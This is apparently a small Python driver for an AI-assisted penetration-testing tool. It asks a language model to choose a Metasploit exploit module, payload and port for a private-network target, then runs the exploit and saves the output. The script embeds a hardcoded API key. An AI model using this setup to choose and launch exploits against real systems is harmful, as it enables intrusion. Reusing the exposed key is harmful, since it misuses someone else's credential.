import json


from llm_interface import MetasploitLLMInterface
from metasploit_rpc import MetasploitExploit



if __name__ == "__main__":
    api_key = "AIzaSyBJcEru-wkA8cOkBI3klLuK9YFtwRqEQcQ"
    target = "192.168.253.130"

    
    metasploit_llm = MetasploitLLMInterface(api_key)

    plan = metasploit_llm.determine_exploit_plan(target)

    if plan:
        exploit_tool = MetasploitExploit()
        result = exploit_tool.scan(
            target=target,
            exploit_module=plan['exploit_module'],
            payload=plan['payload'],
            rport=plan['rport']
        )

        with open("metasploit_output.json", "w") as f:
            json.dump(result, f, indent=2)

        print(json.dumps(result, indent=2))
    else:
        print("Failed to determine exploit plan.")
